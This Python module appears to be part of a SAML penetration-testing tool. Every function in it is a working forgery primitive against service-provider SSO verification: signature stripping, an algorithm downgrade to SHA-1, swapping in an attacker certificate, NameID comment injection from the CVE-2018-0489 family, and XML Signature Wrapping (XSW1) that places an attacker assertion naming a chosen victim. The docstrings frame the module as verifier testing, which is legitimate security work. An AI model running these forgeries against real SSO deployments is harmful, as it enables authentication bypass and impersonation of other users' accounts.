"""Malicious SAML Response / Assertion manipulation.

Operates on an existing signed Response (or a minimal unsigned template) and
emits variants meant to test how forgiving an SP verifier is. Everything
here is something a well-behaved SP should reject; `signxml` refuses to
produce several of these patterns, which is why we build them ourselves.

Each function returns bytes of serialized XML suitable for posting to an SP's
ACS endpoint.

Attacks implemented:
  - strip_signature       : remove every ds:Signature element (classic
                             "verify only if signature present")
  - downgrade_sig_alg     : rewrite SignatureMethod to rsa-sha1. The signed
                             bytes won't verify anymore; this tests whether
                             the SP rejects on alg, on digest, or on the
                             signature value itself (ordering matters).
  - swap_key_info         : replace <KeyInfo><X509Certificate> bytes with a
                             supplied attacker cert. Some SP libs trust
                             embedded KeyInfo over metadata-pinned certs.
  - inject_nameid_comment : insert a comment inside NameID text so the
                             verifier's canonicalizer sees one value but the
                             business logic sees another (CVE-2018-0489 family).
  - xsw1                  : XML Signature Wrapping variant 1 -- clone a
                             signed Assertion into the root's Extensions-like
                             position and put an attacker Assertion where
                             business logic reads.
"""

from __future__ import annotations

from copy import deepcopy
from typing import Any

from lxml import etree

SAMLP_NS = "urn:oasis:names:tc:SAML:2.0:protocol"
SAML_NS = "urn:oasis:names:tc:SAML:2.0:assertion"
DS_NS = "http://www.w3.org/2000/09/xmldsig#"
NSMAP = {"samlp": SAMLP_NS, "saml": SAML_NS, "ds": DS_NS}


class SAMLForgeError(RuntimeError):
    pass


def _parse(xml: bytes) -> "etree._Element":
    try:
        return etree.fromstring(xml)
    except etree.XMLSyntaxError as e:
        raise SAMLForgeError(f"input is not well-formed XML: {e}") from e


def _ser(root: "etree._Element") -> bytes:
    return etree.tostring(root, xml_declaration=False, encoding="utf-8")


# ---------- signature stripping ----------


def strip_signature(xml: bytes) -> bytes:
    """Remove every ds:Signature element from the document."""
    root = _parse(xml)
    sigs = root.xpath(".//ds:Signature", namespaces=NSMAP)
    for s in sigs:
        s.getparent().remove(s)
    return _ser(root)


# ---------- signature algorithm downgrade ----------


_ALG_SHA1 = "http://www.w3.org/2000/09/xmldsig#rsa-sha1"
_DIGEST_SHA1 = "http://www.w3.org/2000/09/xmldsig#sha1"


def downgrade_sig_alg(
    xml: bytes,
    *,
    sig_alg: str = _ALG_SHA1,
    digest_alg: str = _DIGEST_SHA1,
) -> bytes:
    """Rewrite SignatureMethod / DigestMethod to weak algs.

    The signature value itself will no longer verify (contents changed). This
    is still useful: a well-behaved SP rejects at the algorithm check before
    ever looking at the signature bytes, so a `not_trusted_alg` error here is
    the expected outcome. SPs that instead surface `signature mismatch` are
    probably willing to verify with weak algs when signatures *do* match.
    """
    root = _parse(xml)
    for sm in root.xpath(".//ds:SignatureMethod", namespaces=NSMAP):
        sm.set("Algorithm", sig_alg)
    for dm in root.xpath(".//ds:DigestMethod", namespaces=NSMAP):
        dm.set("Algorithm", digest_alg)
    return _ser(root)


# ---------- KeyInfo swap ----------


def swap_key_info(xml: bytes, attacker_cert_b64: str) -> bytes:
    """Replace <X509Certificate> bytes inside every KeyInfo with attacker cert.

    attacker_cert_b64 is the base64-encoded DER of the attacker's cert (the
    same format that appears inside ds:X509Certificate)."""
    root = _parse(xml)
    found = False
    for cert in root.xpath(".//ds:KeyInfo//ds:X509Certificate", namespaces=NSMAP):
        cert.text = attacker_cert_b64
        found = True
    if not found:
        raise SAMLForgeError("no ds:KeyInfo//ds:X509Certificate to swap")
    return _ser(root)


# ---------- NameID comment injection ----------


def inject_nameid_comment(xml: bytes, victim: str, suffix: str = ".attacker.test") -> bytes:
    """Replace the first NameID text with 'victim<!---->suffix'.

    Verifiers canonicalize text nodes and feed them into the signature,
    which operates on concatenated siblings; buggy business-logic reads
    that then call getText()/textContent may stop at the first comment,
    yielding just the victim portion. CVE-2018-0489 family.
    """
    root = _parse(xml)
    nameid = root.find(".//{urn:oasis:names:tc:SAML:2.0:assertion}NameID")
    if nameid is None:
        raise SAMLForgeError("no saml:NameID found")
    # Build: <NameID>victim<!---->suffix</NameID>
    nameid.text = victim
    comment = etree.Comment("")
    comment.tail = suffix
    nameid.append(comment)
    return _ser(root)


# ---------- XSW1 -- XML Signature Wrapping variant 1 ----------


def xsw1(xml: bytes, evil_subject_name_id: str) -> bytes:
    """XSW1: clone the original signed Assertion into Extensions-like
    container; place an attacker-controlled Assertion (with a different
    NameID) in the position the SP business logic reads.

    Both copies are present, so:
      - the verifier finds the signed Assertion (clone) and validates.
      - the SP reads the first Assertion child of Response (the evil one).

    Only works against verifiers that re-scan by tag name instead of by
    the Reference URI the signature actually points at.
    """
    root = _parse(xml)
    if root.tag != f"{{{SAMLP_NS}}}Response":
        raise SAMLForgeError("XSW1 requires a samlp:Response root")
    signed = root.find(f"./{{{SAML_NS}}}Assertion")
    if signed is None:
        raise SAMLForgeError("no saml:Assertion to wrap")

    # Deep-clone the signed assertion so the signature stays intact inside.
    clone = deepcopy(signed)

    # Build evil assertion by cloning original structure + swapping NameID.
    evil = deepcopy(signed)
    # Remove signature from the evil copy -- the signed clone keeps the sig.
    for s in evil.xpath("./ds:Signature", namespaces=NSMAP):
        evil.remove(s)
    # Swap NameID text on the evil copy.
    ev_nameid = evil.find(f".//{{{SAML_NS}}}NameID")
    if ev_nameid is not None:
        # Clear children (e.g. the comment node) and set fresh text.
        for child in list(ev_nameid):
            ev_nameid.remove(child)
        ev_nameid.text = evil_subject_name_id
    # Wrap ID collision: keep same ID so business logic picks this one.
    # Change the signed clone's ID so the outer doc still has two Assertion
    # elements; many parsers tolerate duplicate IDs.

    # Place the signed clone inside a parasitic Extensions element so the
    # signature reference still resolves but the element is outside the
    # business-logic traversal.
    extensions = etree.SubElement(root, f"{{{SAMLP_NS}}}Extensions")
    extensions.append(clone)

    # Replace the original signed assertion with the evil one.
    root.remove(signed)
    # Insert the evil assertion *before* Extensions so it's the first
    # saml:Assertion child of the Response.
    root.insert(list(root).index(extensions), evil)
    return _ser(root)


# ---------- minimal template for operators with no real Response ----------


def minimal_response_template(
    *,
    issuer: str,
    audience: str,
    recipient: str,
    in_response_to: str,
    subject_name_id: str,
    not_on_or_after: str,
    not_before: str,
) -> bytes:
    """Build an unsigned samlp:Response the operator can feed into forge
    primitives. Useful when you want a known-shape starting point rather than
    a captured real Response."""
    root = etree.Element(
        f"{{{SAMLP_NS}}}Response",
        nsmap={"samlp": SAMLP_NS, "saml": SAML_NS, "ds": DS_NS},
        attrib={
            "ID": "_template-resp",
            "Version": "2.0",
            "IssueInstant": not_before,
            "InResponseTo": in_response_to,
            "Destination": recipient,
        },
    )
    etree.SubElement(root, f"{{{SAML_NS}}}Issuer").text = issuer
    status = etree.SubElement(root, f"{{{SAMLP_NS}}}Status")
    etree.SubElement(status, f"{{{SAMLP_NS}}}StatusCode").set(
        "Value", "urn:oasis:names:tc:SAML:2.0:status:Success"
    )
    assertion = etree.SubElement(
        root,
        f"{{{SAML_NS}}}Assertion",
        attrib={"ID": "_template-assertion", "Version": "2.0", "IssueInstant": not_before},
    )
    etree.SubElement(assertion, f"{{{SAML_NS}}}Issuer").text = issuer
    subject = etree.SubElement(assertion, f"{{{SAML_NS}}}Subject")
    etree.SubElement(subject, f"{{{SAML_NS}}}NameID").text = subject_name_id
    sc = etree.SubElement(subject, f"{{{SAML_NS}}}SubjectConfirmation")
    sc.set("Method", "urn:oasis:names:tc:SAML:2.0:cm:bearer")
    scd = etree.SubElement(sc, f"{{{SAML_NS}}}SubjectConfirmationData")
    scd.set("InResponseTo", in_response_to)
    scd.set("Recipient", recipient)
    scd.set("NotOnOrAfter", not_on_or_after)
    conditions = etree.SubElement(
        assertion, f"{{{SAML_NS}}}Conditions",
        attrib={"NotBefore": not_before, "NotOnOrAfter": not_on_or_after},
    )
    ar = etree.SubElement(conditions, f"{{{SAML_NS}}}AudienceRestriction")
    etree.SubElement(ar, f"{{{SAML_NS}}}Audience").text = audience
    return _ser(root)
